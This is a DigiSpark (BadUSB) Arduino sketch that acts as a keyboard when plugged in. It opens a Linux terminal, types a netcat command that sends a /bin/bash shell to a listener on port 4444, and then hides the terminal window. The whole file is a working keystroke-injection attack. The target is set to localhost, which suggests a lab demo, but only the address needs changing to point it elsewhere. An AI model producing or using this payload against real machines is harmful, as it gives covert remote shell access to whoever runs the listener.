#include "DigiKeyboard.h"

void setup() {
  // Wait for the machine to detect the DigiSpark, then send a wake-up signal
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  // Allow for full keyboard use, then open a terminal
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_RIGHT); // If in VirtualBox, will allow for left CTRL usage
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);

  // Enter a netcat command to connect to a listener and establish a reverse bind shell, then hide the terminal window
  DigiKeyboard.println("nc 127.0.0.1 4444 -e /bin/bash");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
}

void loop() {
  
}
